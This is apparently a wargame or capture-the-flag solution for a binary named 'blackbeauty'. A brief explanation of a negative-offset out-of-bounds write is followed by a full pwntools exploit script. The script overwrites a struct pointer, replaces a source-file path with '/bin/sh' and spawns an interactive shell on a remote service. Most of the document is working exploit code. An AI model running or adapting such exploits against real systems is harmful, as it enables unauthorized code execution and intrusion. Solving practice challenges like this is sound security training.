# SOLUTION

Setting the offset to -8 allows us to write the the symbol member of the
ticker\_tape struct. Now, we can write the address of the src\_file global
variable to the member byte by byte. After we have overwritten the char array
pointer, we can choose to change the symbol to overwrite the src\_file variable
with "/bin/sh". Finally, we trigger the shell by executing the view source
command.

The solution script:

```py
from pwn import *

#context.log_level = 'debug'

def main():
    #p = process("./blackbeauty")
    p = remote("wargame", 31341)

    # Random tape length
    p.sendline("10")

    # Write the address of the src file to the symbol member struct
    src_file_address = p64(0x60c980)
    p.sendline("3")
    p.sendline("-8")
    for i in src_file_address:
        p.sendline("2")
        p.sendline(str(ord(i)))

    # Write new shell command
    p.sendline("4")
    p.send("/bin/sh".ljust(16, "\x00"))

    # Spawn the shell
    p.sendline("8")

    p.recvrepeat(0.2)

    log.success("Enjoy your shell!")
    p.interactive()

if __name__ == "__main__":
    main()

```
